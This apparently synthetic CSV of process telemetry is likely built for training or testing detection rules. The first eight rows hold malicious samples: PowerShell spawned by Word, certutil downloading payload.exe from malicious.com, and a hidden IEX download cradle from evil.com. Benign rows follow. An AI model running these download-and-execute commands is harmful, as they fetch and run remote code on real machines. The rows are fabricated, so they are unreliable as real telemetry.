timestamp,process,parent_process,command_line,ip,destination_port,user_agent
2026-03-30 18:07:45,powershell.exe,winword.exe,powershell -enc aW52b2tl,8.8.8.8,4444,curl
2026-03-30 18:07:46,powershell.exe,winword.exe,powershell -enc aW52b2tl,45.33.32.156,4444,python-requests
2026-03-30 18:07:47,powershell.exe,winword.exe,powershell -enc aW52b2tl,1.1.1.1,4444,curl
2026-03-30 18:07:48,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,4444,python-requests
2026-03-30 18:07:49,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),45.33.32.156,443,curl
2026-03-30 18:07:50,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:07:51,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:07:52,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:07:53,chrome.exe,explorer.exe,explorer open folder,192.168.1.72,0,chrome
2026-03-30 18:07:54,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.91,0,chrome
2026-03-30 18:07:55,notepad.exe,explorer.exe,cmd dir,192.168.1.70,0,chrome
2026-03-30 18:07:56,notepad.exe,explorer.exe,explorer open folder,192.168.1.103,0,chrome
2026-03-30 18:07:57,cmd.exe,explorer.exe,cmd dir,192.168.1.77,0,chrome
2026-03-30 18:07:58,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.179,0,chrome
2026-03-30 18:07:59,cmd.exe,explorer.exe,explorer open folder,192.168.1.178,0,chrome
2026-03-30 18:08:00,cmd.exe,explorer.exe,cmd dir,192.168.1.235,0,chrome
2026-03-30 18:08:01,explorer.exe,explorer.exe,explorer open folder,192.168.1.214,0,chrome
2026-03-30 18:08:02,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.61,0,chrome
2026-03-30 18:08:03,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.176,0,chrome
2026-03-30 18:08:04,explorer.exe,explorer.exe,cmd dir,192.168.1.169,0,chrome
2026-03-30 18:08:05,cmd.exe,explorer.exe,notepad file.txt,192.168.1.138,0,chrome
2026-03-30 18:08:06,cmd.exe,explorer.exe,cmd dir,192.168.1.219,0,chrome
2026-03-30 18:08:07,explorer.exe,explorer.exe,notepad file.txt,192.168.1.194,0,chrome
2026-03-30 18:08:08,chrome.exe,explorer.exe,explorer open folder,192.168.1.139,0,chrome
2026-03-30 18:08:09,explorer.exe,explorer.exe,notepad file.txt,192.168.1.133,0,chrome
2026-03-30 18:08:10,cmd.exe,explorer.exe,explorer open folder,192.168.1.196,0,chrome
2026-03-30 18:08:11,cmd.exe,explorer.exe,notepad file.txt,192.168.1.91,0,chrome
2026-03-30 18:08:12,explorer.exe,explorer.exe,explorer open folder,192.168.1.126,0,chrome
2026-03-30 18:08:13,notepad.exe,explorer.exe,notepad file.txt,192.168.1.89,0,chrome
2026-03-30 18:08:14,notepad.exe,explorer.exe,notepad file.txt,192.168.1.250,0,chrome
2026-03-30 18:08:15,explorer.exe,explorer.exe,cmd dir,192.168.1.13,0,chrome
2026-03-30 18:08:16,notepad.exe,explorer.exe,cmd dir,192.168.1.43,0,chrome
2026-03-30 18:08:17,cmd.exe,explorer.exe,notepad file.txt,192.168.1.73,0,chrome
2026-03-30 18:08:18,cmd.exe,explorer.exe,explorer open folder,192.168.1.22,0,chrome
2026-03-30 18:08:19,chrome.exe,explorer.exe,notepad file.txt,192.168.1.184,0,chrome
2026-03-30 18:08:20,chrome.exe,explorer.exe,explorer open folder,192.168.1.223,0,chrome
2026-03-30 18:08:21,explorer.exe,explorer.exe,cmd dir,192.168.1.36,0,chrome
2026-03-30 18:08:22,cmd.exe,explorer.exe,explorer open folder,192.168.1.93,0,chrome
2026-03-30 18:08:23,notepad.exe,explorer.exe,notepad file.txt,192.168.1.106,0,chrome
2026-03-30 18:08:24,explorer.exe,explorer.exe,notepad file.txt,192.168.1.211,0,chrome
2026-03-30 18:08:25,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.243,0,chrome
2026-03-30 18:08:26,explorer.exe,explorer.exe,notepad file.txt,192.168.1.195,0,chrome
2026-03-30 18:08:27,chrome.exe,explorer.exe,notepad file.txt,192.168.1.155,0,chrome
2026-03-30 18:08:28,notepad.exe,explorer.exe,explorer open folder,192.168.1.108,0,chrome
